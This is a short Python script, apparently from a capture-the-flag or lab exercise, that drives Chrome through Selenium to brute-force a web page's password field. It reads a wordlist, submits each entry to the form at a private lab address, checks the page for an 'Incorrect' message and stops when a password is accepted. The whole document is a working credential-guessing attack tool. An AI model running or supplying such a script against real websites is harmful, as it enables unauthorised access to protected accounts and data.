#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

host = 'http://10.10.10.10/index.html'
file = 'wordlist.txt'

input_field_id = 'dec-password'
login_button_id = 'submit'

invalid_id = 'password-help'
invalid_string = 'Incorrect'

driver = driver = webdriver.Chrome('/usr/bin/chromedriver')

# get website
driver.get(host)

#find  input field
pwinput = driver.find_elements_by_id(input_field_id)[0]


#open file
f = open(file)
for line in f.readlines():

    #input string
    line = line.strip()
    pwinput.send_keys(line)

    decryptbutton = driver.find_elements_by_id(login_button_id)[0]

    #click button
    decryptbutton.click()

    #check incorrect or not
    result = driver.find_elements_by_id(invalid_id)[0]

    if invalid_string in result.text:
        print(line + " INVALID")
    else:
        print(line + " *****************SUCCESS**************")
        break






